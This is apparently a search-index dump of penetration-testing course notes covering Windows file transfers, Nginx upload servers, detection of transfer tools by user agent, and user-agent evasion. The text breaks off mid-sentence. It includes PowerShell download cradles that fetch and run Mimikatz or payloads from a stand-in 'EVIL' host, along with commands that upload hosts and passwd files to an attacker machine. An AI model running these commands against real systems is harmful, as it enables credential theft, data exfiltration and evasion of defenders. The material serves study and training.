<p></p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#download-operations","title":"Download Operations","text":"<p>We have access to the machine MS02 and we need to download a file from Pwnbox machine. let's see how we can accomplish this using multiple File Download methos.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#powershell-based64-encode-decode","title":"PowerShell Based64 Encode &amp; Decode","text":"<p>Purpose: to transfer files without requiring network communication, particulary in situations where only terminal access is availble.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#steps-overview","title":"Steps Overview","text":"<ol> <li> <p>Base64 Econding and Decoding</p> <ul> <li>Use terminal commands to encode a file into a base64 string.</li> <li>Copy the cocoded string from the source terminal.</li> <li>Decode the base64 string back into the original file on the target system.</li> </ul> </li> <li> <p>Ensuring File Integrity:</p> <ul> <li>Verfiy that the transferred file is correct by comparing its MD5 checksum.</li> <li>Use <code>md5sum</code> (or equivalent tools) to calculate the compare MD5 hash before and after the transfer.</li> </ul> </li> </ol> <p>Detailed Process: 1. Encoding a File to Base64 (Source System): In PowerShell:     <pre><code>[Convert]::ToBase64String((Get-Content -Path \"file.txt\" -Encoding byte)) &gt; encoded.txt\n</code></pre>     OR in linux     <pre><code>base64 file.txt &gt; encoded.txt\n</code></pre></p> <ol> <li>Transfer Base64 String:<ul> <li>Open the encoded file (encoded.txt) in the terminal.</li> <li>Copy its contents manually to the target system's terminal.</li> </ul> </li> <li>Decoding the File on the Target System: In PowerShell: <pre><code>[IO.File]::WriteAllBytes(\"file_decoded.txt\", [Convert]::FromBase64String((Get-Content -Path \"encoded.txt\")))\n</code></pre> OR linux <pre><code>base64 -d encoded.txt &gt; file_decode.txt\n</code></pre></li> <li> <p>Verify File Integrity</p> <ul> <li>On both systems, generate the MD5 hash of the original and decoded file.</li> </ul> <p><pre><code>    md5sum file.txt\n</code></pre> Compare the hashes. if they match, the file transfer was successful. </p> </li> </ol>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#use-case-example","title":"Use Case Example:","text":"<ul> <li>Transferring an SSH key:<ul> <li>Encode the key on the source system.</li> <li>Copy the base64 string to the target system.</li> <li>Decode the string back into the original SSH key file.</li> <li>Verify the integrity using the MD5 checksum.</li> </ul> </li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#advantages","title":"Advantages:","text":"<ul> <li>No need for network connectivity.</li> <li>Useful for secure environments with restricted communication channels.</li> </ul> <p>Considerations: - Ensure proper copying and pasting of the base64 string to avoid corruption. - MD5 is not cryptographically secure for authentication purposes but is adequate for verifying file integrity.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#pwnbox-check-ssh-key-md5-hash","title":"Pwnbox Check SSH Key MD5 Hash","text":"<pre><code>```bash\n    md5sum id_rsa\n```\noutput:\n```4e301756a07ded0a2dd6953abf015278  id_rsa```\n</code></pre>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#pwnbox-encode-ssh-key-to-base64","title":"Pwnbox Encode SSH Key to Base64","text":"<pre><code>```bash\ncat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJT.....\n```\n</code></pre> <p>We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.</p> <pre><code>PS C:\\htb&gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVO...\"))\n</code></pre> <p>Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#confirming-the-md5-hashes-match","title":"Confirming the MD5 Hashes Match","text":"<p><pre><code>Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n</code></pre> </p> <p><code>Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</code></p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#notes-on-file-transfer-using-powershell-and-webclient","title":"Notes on File Transfer Using PowerShell and WebClient","text":"<p>Most companies allow HTTP and HTTPS outbound traffic through the firewall to facilitate employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. However, defenders can implement Web filtering solutions to:</p> <ul> <li>Prevent access to specific website categories.</li> <li>Block the download of certain file types (e.g., <code>.exe</code>).</li> <li>Restrict access to a whitelist of domains in highly controlled networks.</li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#file-transfer-with-powershell","title":"File Transfer with PowerShell","text":"<p>PowerShell offers various file transfer options. In any version of PowerShell, the <code>System.Net.WebClient</code> class can be used to download files over HTTP, HTTPS, or FTP.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#webclient-methods-for-downloading-data","title":"WebClient Methods for Downloading Data","text":"Method Description <code>OpenRead</code> Returns the data from a resource as a <code>Stream</code>. <code>OpenReadAsync</code> Returns the data from a resource without blocking the calling thread. <code>DownloadData</code> Downloads data from a resource and returns a <code>Byte</code> array. <code>DownloadDataAsync</code> Downloads data from a resource as a <code>Byte</code> array without blocking the calling thread. <code>DownloadFile</code> Downloads data from a resource to a local file. <code>DownloadFileAsync</code> Downloads data to a local file without blocking the calling thread. <code>DownloadString</code> Downloads a <code>String</code> from a resource and returns a <code>String</code>. <code>DownloadStringAsync</code> Downloads a <code>String</code> without blocking the calling thread."},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#example-powershell-downloadfile-method","title":"Example: PowerShell <code>DownloadFile</code> Method","text":"<p>The <code>Net.WebClient</code> class and its <code>DownloadFile</code> method allow you to specify:</p> <ol> <li>The URL of the target file to download.</li> <li>The name of the output file where the content will be saved.</li> </ol> <p>Example usage: <pre><code>$webClient = New-Object System.Net.WebClient\n$webClient.DownloadFile(\"https://example.com/file.txt\", \"C:\\path\\to\\output\\file.txt\")\nPS C:\\htb&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\htb&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\htb&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')\n</code></pre></p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#powershell-downloadstring-fileless-method","title":"PowerShell DownloadString-Fileless Method","text":"<p>AS we previously discussed, fileless attacks work by using some operating system functions to downlod the payload and exccute it directly. Powershell can also be used to perfom fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in the memory using the <code>Invoke-Expression</code> cmdlet or the alias <code>IEX</code>. <pre><code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Empire/master/data/module/source/credentials/Invoke-Mimikatz.ps1')\n</code></pre> The <code>IEX</code> aslo accepts pipeline input.</p> <pre><code>PS C:\\htb&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#powershell-invoke-webrequest","title":"PowerShell Invoke-WebRequest","text":"<p>From PowerShell 3.0 onwards, the <code>Invoke-WebRequest</code> cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name. <pre><code>    PS C:\\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n</code></pre> <code>Harmj0y</code> has compiled an extensive list of PowerShell download cradles here. It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#list-of-commands-by-harmj0y","title":"List of commands by HarmJ0y","text":"<p>https://gist.github.com/HarmJ0y/bb48307ffa663256e239 <pre><code># normal download cradle\nIEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")\n\n# PowerShell 3.0+\nIEX (iwr 'http://EVIL/evil.ps1')\n\n# hidden IE com object\n$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r\n\n# Msxml2.XMLHTTP COM object\n$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText\n\n# WinHttp COM object (not proxy aware!)\n$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText\n\n# using bitstransfer- touches disk!\nImport-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\\t;$r=gc $env:temp\\t;rm $env:temp\\t; iex $r\n\n# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)\n#   code to execute needs to be a base64 encoded string stored in a TXT record\nIEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt \"SERVER\" | Select -Pattern '\"*\"') -split '\"'[0]))))\n\n# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d\n&lt;#\n&lt;?xml version=\"1.0\"?&gt;\n&lt;command&gt;\n   &lt;a&gt;\n      &lt;execute&gt;Get-Process&lt;/execute&gt;\n   &lt;/a&gt;\n  &lt;/command&gt;\n#&gt;\n$a = New-Object System.Xml.XmlDocument\n$a.Load(\"https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt\")\n$a.command.a.execute | iex\n</code></pre></p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#smb-downloads","title":"SMB Downloads","text":"<p>The Server Message Block protocol (SMB protocol) that runs on port <code>TCP/445</code> is common in enterprise networks where windows services are running. It enables applications and users to transfer files to and from remote servers.</p> <p>WE can use SMB to download files from our pwnbox easily. We need to create an SMB server in our pwnbox with <code>smbserver.py</code> from impacket and then use <code>copy</code>, <code>move</code>,PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#create-the-smb-server","title":"Create the sMB Server","text":"<p><pre><code>    sudo impacket-smbserver share -smb2support /tmp/smbshare\n</code></pre> To download a file from the SMB server to the current working directory, we can use the following command:</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#copy-a-file-from-the-smb-server","title":"Copy a File from the SMB Server","text":"<p><pre><code>    copy \\\\&lt;ip&gt;\\share\\nc.exe\n</code></pre> New versions of Windows block unauthenticated guest access, as we can see in the following command:</p> <p><pre><code>    copy \\\\&lt;ip&gt;\\share\\nc.exe\n</code></pre> Error: You can't access this share folder because your organization's security policies block unauthenticaed guest access. ....</p> <p>To transfer files in this scenario we can set a username and password using out Impacket SMB server and mount the SMB server on our windows target machine:</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#create-the-smb-server-with-a-username-and-password","title":"Create the SMB Server with a Username and Password","text":"<pre><code>    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n</code></pre>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#mount-the-smb-server-with-username-and-password","title":"Mount the SMB Server with Username and Password","text":"<pre><code>    net use n: \\\\&lt;ip&gt;\\share /user:test test\n    #The command completed successfully\n    C:\\htb&gt; copy n:\\nc.exe\n    #        1 fiel(s) copied.\n</code></pre>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#powershell-base64-web-upload","title":"PowerShell Base64 Web Upload","text":"<p>This method demonstrates how PowerShell can be used to encode a file in Base64 and upload it to a server using <code>Invoke-WebRequest</code>. The payload is transmitted as a POST request to a specified URI, and the data is then caught using Netcat. Afterward, the data is decoded back to its original form.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#step-1-encoding-the-file-in-base64","title":"Step 1: Encoding the File in Base64","text":"<p>First, we convert the contents of a file (<code>hosts</code> file in this case) into Base64:</p> <pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' -Encoding Byte))\n</code></pre> <p>This command reads the <code>hosts</code> file as raw bytes and then converts it into a Base64 string.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#step-2-uploading-the-encoded-file-via-http","title":"Step 2: Uploading the Encoded File via HTTP","text":"<p>Next, we use <code>Invoke-WebRequest</code> to upload the Base64 encoded file to a remote server. The server is assumed to be listening on port 8000:</p> <pre><code>Invoke-WebRequest -Uri &lt;http://192.168.49.128:8000/&gt; -Method POST -Body $b64\n</code></pre> <p>Here, we send the encoded file as a POST request with the Base64 string as the body.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#step-3-catching-the-data-with-netcat","title":"Step 3: Catching the Data with Netcat","text":"<p>On the receiving server (listening on port 8000), we use Netcat to catch the incoming Base64 data:</p> <pre><code>$ nc -lvnp 8000\n</code></pre> <p>Netcat listens for connections and displays the incoming data. The Base64-encoded content appears in the console.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#step-4-decoding-the-file","title":"Step 4: Decoding the File","text":"<p>After receiving the Base64-encoded data, we decode it back to its original file using the <code>base64</code> tool:</p> <pre><code>bash\nCopy code\necho &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre> <p>This command takes the Base64 data, decodes it, and writes it back to a file (<code>hosts</code>).</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#smb-uploads-via-webdav","title":"SMB Uploads via WebDAV","text":"<p>The next section discusses using SMB over HTTP with WebDAV. Many organizations restrict SMB traffic (TCP/445) due to security concerns, but WebDAV provides a workaround by running SMB over HTTP (TCP/80). This method is commonly used for file sharing and remote access.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#setting-up-webdav-server","title":"Setting Up WebDAV Server","text":"<p>To set up a WebDAV server, we install the necessary Python modules:</p> <pre><code>$ sudo pip3 install wsgidav cheroot\n</code></pre> <p>Then, we run the WebDAV server:</p> <pre><code>$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous\n</code></pre> <p>This command runs the WebDAV server on port 80, serving files from <code>/tmp</code> with anonymous authentication.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#connecting-to-the-webdav-share","title":"Connecting to the WebDAV Share","text":"<p>Once the WebDAV server is set up, we can access it from a Windows machine using the <code>DavWWWRoot</code> folder:</p> <pre><code>dir \\\\\\\\192.168.49.128\\\\DavWWWRoot\n</code></pre> <p>This command lists the files available on the WebDAV server.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#uploading-files-via-webdav","title":"Uploading Files via WebDAV","text":"<p>To upload a file (e.g., <code>SourceCode.zip</code>) to the WebDAV share, we use the <code>copy</code> command:</p> <pre><code>C:\\\\Users\\\\john\\\\Desktop\\\\SourceCode.zip \\\\\\\\192.168.49.128\\\\DavWWWRoot\\\\\n</code></pre> <p>This uploads the specified file to the WebDAV share, allowing for easy file transfer over HTTP.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#ftp-uploads","title":"FTP Uploads","text":"<p>FTP (File Transfer Protocol) is another method for uploading files. In this section, we discuss how to set up an FTP server using Python's <code>pyftpdlib</code> module and how to use PowerShell or command line tools to upload files to it.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#setting-up-the-ftp-server","title":"Setting Up the FTP Server","text":"<p>We start the FTP server with the <code>--write</code> flag to allow uploading:</p> <pre><code>$ sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> <p>This starts the FTP server on port 21, with write permissions for anonymous users.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#uploading-files-via-powershell","title":"Uploading Files via PowerShell","text":"<p>Using PowerShell, we can upload a file to the FTP server with the following command:</p> <pre><code>(New-Object Net.WebClient).UploadFile('&lt;ftp://192.168.49.128/ftp-hosts&gt;', 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts')\n</code></pre> <p>This command uploads the <code>hosts</code> file to the specified FTP server.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#creating-an-ftp-command-file","title":"Creating an FTP Command File","text":"<p>Alternatively, you can create an FTP command file (<code>ftpcommand.txt</code>) to automate the file upload process:</p> <pre><code>echo open 192.168.49.128 &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho PUT c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre> <p>This script automates logging in, setting the transfer mode to binary, uploading the file, and closing the connection.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#recap","title":"Recap","text":"<p>This section highlighted multiple methods to upload files using native tools such as PowerShell, FTP, and WebDAV. Each method allows file transfer under different network configurations, offering flexibility in various penetration testing scenarios.</p>"},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/","title":"catching files over HTTPS","text":""},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#catching-files-over-https","title":"Catching Files over HTTP/S","text":""},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#https-overview","title":"HTTP/S Overview","text":"<p>Web transfer is one of the most common methods for transferring files due to HTTP/HTTPS being widely allowed through firewalls. Additionally, file transfers over HTTPS are encrypted in transit, reducing the risk of interception. However, transferring sensitive files in plaintext can trigger alerts from a client\u2019s network IDS and lead to security concerns.</p> <p>Previously, we discussed setting up a Python3 upload server for file transfers. Here, we explore creating a secure web server using Nginx for file uploads.</p>"},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#nginx-enabling-put","title":"Nginx - Enabling PUT","text":"<p>Nginx is a robust alternative to Apache for file transfers. Its configuration is straightforward, and its module system mitigates some of the security risks inherent to Apache, such as inadvertent PHP execution.</p>"},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#steps-to-configure-nginx","title":"Steps to Configure Nginx:","text":"<ol> <li> <p>Create a Directory for Uploaded Files</p> <pre><code>sudo mkdir -p /var/www/uploads/SecretUploadDirectory\n</code></pre> </li> <li> <p>Change Ownership to <code>**www-data**</code></p> <pre><code>sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\n</code></pre> </li> <li> <p>Create an Nginx Configuration File Create the file <code>/etc/nginx/sites-available/upload.conf</code> with the following content:</p> <pre><code>server {\n    listen 9001;\n\n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n</code></pre> </li> <li> <p>Symlink the Site to the <code>**sites-enabled**</code> Directory</p> <pre><code>sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\n</code></pre> </li> <li> <p>Start Nginx</p> <pre><code>sudo systemctl restart nginx.service\n</code></pre> <p>If errors occur, check the logs at <code>/var/log/nginx/error.log</code>. For example:</p> <pre><code>tail -2 /var/log/nginx/error.log\n</code></pre> </li> </ol>"},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#troubleshooting","title":"Troubleshooting:","text":"<p>If port 80 is already in use, identify the process using it:</p> <pre><code>ss -lnpt | grep 80\nps -ef | grep [PID]\n</code></pre> <p>Remove the default Nginx configuration to free up port 80:</p> <pre><code>sudo rm /etc/nginx/sites-enabled/default\n</code></pre>"},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#testing-file-uploads-with-curl","title":"Testing File Uploads with cURL:","text":"<p>Upload a file using a PUT request:</p> <pre><code>curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt\n</code></pre> <p>Verify the upload:</p> <pre><code>sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt\n</code></pre> <p>Ensure directory listing is disabled by visiting <code>http://localhost/SecretUploadDirectory</code>. Unlike Apache, Nginx does not enable directory listing by default.</p>"},{"location":"CPTS/File%20Transfers/catching_files_over_HTTPS/#using-built-in-tools","title":"Using Built-in Tools","text":"<p>In subsequent sections, we will explore the concept of \"Living off the Land,\" leveraging built-in utilities in Windows and Linux for file transfers and other tasks such as privilege escalation and Active Directory exploitation. This approach minimizes the need for external tools and enhances stealth during penetration tests.</p>"},{"location":"CPTS/File%20Transfers/detection/","title":"Detection","text":""},{"location":"CPTS/File%20Transfers/detection/#detection","title":"Detection","text":"<p>Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.</p> <p>Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the\u00a0<code>HTTP</code>\u00a0protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which\u00a0<code>HTTP</code>\u00a0client is connecting to it, for example, Firefox, Chrome, etc.</p> <p>User agents are not only used to identify web browsers, but anything acting as an\u00a0<code>HTTP</code>\u00a0client and connecting to a web server via\u00a0<code>HTTP</code>\u00a0can have a user agent string (i.e.,\u00a0<code>cURL</code>, a custom\u00a0<code>Python</code>\u00a0script, or common tools such as\u00a0<code>sqlmap</code>, or\u00a0<code>Nmap</code>).</p> <p>Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This\u00a0website\u00a0is handy for identifying common user agent strings. A list of user agent strings is available\u00a0here.</p> <p>Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common\u00a0<code>HTTP</code>\u00a0transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).</p>"},{"location":"CPTS/File%20Transfers/detection/#invoke-webrequest-client","title":"Invoke-WebRequest - Client","text":"<p>Detection</p> <pre><code>PS C:\\htb&gt; Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile \"C:\\Users\\Public\\nc.exe\" \nPS C:\\htb&gt; Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile \"C:\\Users\\Public\\nc.exe\"\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#invoke-webrequest-server","title":"Invoke-WebRequest - Server","text":"<p>Detection</p> <pre><code>GET /nc.exe HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#winhttprequest-client","title":"WinHttpRequest - Client","text":"<p>Detection</p> <pre><code>PS C:\\htb&gt; $h=new-object -com WinHttp.WinHttpRequest.5.1;\nPS C:\\htb&gt; $h.open('GET','http://10.10.10.32/nc.exe',$false);\nPS C:\\htb&gt; $h.send();\nPS C:\\htb&gt; iex $h.ResponseText\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#winhttprequest-server","title":"WinHttpRequest - Server","text":"<p>Detection</p> <pre><code>GET /nc.exe HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#msxml2-client","title":"Msxml2 - Client","text":"<p>Detection</p> <pre><code>PS C:\\htb&gt; $h=New-Object -ComObject Msxml2.XMLHTTP;\nPS C:\\htb&gt; $h.open('GET','http://10.10.10.32/nc.exe',$false);\nPS C:\\htb&gt; $h.send();\nPS C:\\htb&gt; iex $h.responseText\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#msxml2-server","title":"Msxml2 - Server","text":"<p>Detection</p> <pre><code>GET /nc.exe HTTP/1.1\nAccept: */*\nAccept-Language: en-us\nUA-CPU: AMD64\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#certutil-client","title":"Certutil - Client","text":"<p>Detection</p> <pre><code>C:\\htb&gt; certutil -urlcache -split -f http://10.10.10.32/nc.exe \nC:\\htb&gt; certutil -verifyctl -split -f http://10.10.10.32/nc.exe\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#certutil-server","title":"Certutil - Server","text":"<p>Detection</p> <pre><code>GET /nc.exe HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nAccept: */*\nUser-Agent: Microsoft-CryptoAPI/10.0\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#bits-client","title":"BITS - Client","text":"<p>Detection</p> <pre><code>PS C:\\htb&gt; Import-Module bitstransfer;\nPS C:\\htb&gt; Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\\t;\nPS C:\\htb&gt; $r=gc $env:temp\\t;\nPS C:\\htb&gt; rm $env:temp\\t; \nPS C:\\htb&gt; iex $r\n</code></pre>"},{"location":"CPTS/File%20Transfers/detection/#bits-server","title":"BITS - Server","text":"<p>Detection</p> <pre><code>HEAD /nc.exe HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nAccept-Encoding: identity\nUser-Agent: Microsoft BITS/7.8\n</code></pre> <p>This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress. We will cover threat hunting and detection techniques in-depth in later modules.</p>"},{"location":"CPTS/File%20Transfers/evasion_detection/","title":"Evasion detection","text":""},{"location":"CPTS/File%20Transfers/evasion_detection/#evading-detection","title":"Evading Detection","text":""},{"location":"CPTS/File%20Transfers/evasion_detection/#changing-user-agent","title":"Changing User Agent","text":"<p>If diligent administrators or defenders have blacklisted certain User Agents, <code>Invoke-WebRequest</code> contains a <code>UserAgent</code> parameter. This allows for changing the default user agent to one emulating browsers like Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, setting a User Agent to emulate Chrome may make the request appear legitimate if Chrome is commonly used internally.</p>"},{"location":"CPTS/File%20Transfers/evasion_detection/#listing-user-agents","title":"Listing User Agents","text":"<pre><code>evading_detection\nPS C:\\htb&gt;[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label=\"User Agent\";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl\n\nName       : InternetExplorer\nUser Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)\n\nName       : FireFox\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0\n\nName       : Chrome\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6\n\nName       : Opera\nUser Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1\n\nName       : Safari\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16\n</code></pre>"},{"location":"CPTS/File%20Transfers/evasion_detection/#invoking-invoke-webrequest-with-a-chrome-user-agent","title":"Invoking <code>Invoke-WebRequest</code> with a Chrome User Agent","text":"<p>Request Example:</p> <pre><code>Request with Chrome User Agent\nPS C:\\htb&gt; $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome\nPS C:\\htb&gt; Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\"\n</code></pre> <p>Listening on Attack Host:</p> <pre><code>evading_detection\n0xs5@htb[/htb]$ nc -lvnp 80\n\nlistening on [any] 80 ...\nconnect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313\nGET /nc.exe HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6\n(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6\nHost: 10.10.10.32\nConnection: Keep-Alive\n</code></pre>"},{"location":"CPTS/File%20Transfers/evasion_detection/#lolbas-gtfobins","title":"LOLBAS / GTFOBins","text":"<p>Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders. In these cases, an option is to use a \"LOLBIN\" (Living Off the Land Binary), also known as \"misplaced trust 